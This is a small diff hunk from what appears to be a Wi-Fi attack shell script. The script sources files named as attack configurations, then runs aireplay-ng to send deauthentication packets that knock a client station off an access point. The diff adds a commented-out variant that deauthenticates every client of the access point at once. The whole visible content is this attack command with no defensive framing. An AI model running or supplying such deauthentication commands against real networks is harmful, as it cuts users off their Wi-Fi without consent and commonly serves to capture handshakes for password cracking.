@@ -10,4 +10,4 @@ source "$CURRENT_ATTACK_FILE"
 source "$CONFIG_ATTACK"
 
 aireplay-ng --deauth 4 -a "$BSSID" -c "$STATION" "$INTERFACE"
-
+#aireplay-ng --deauth 4 -a "$BSSID" "$INTERFACE"
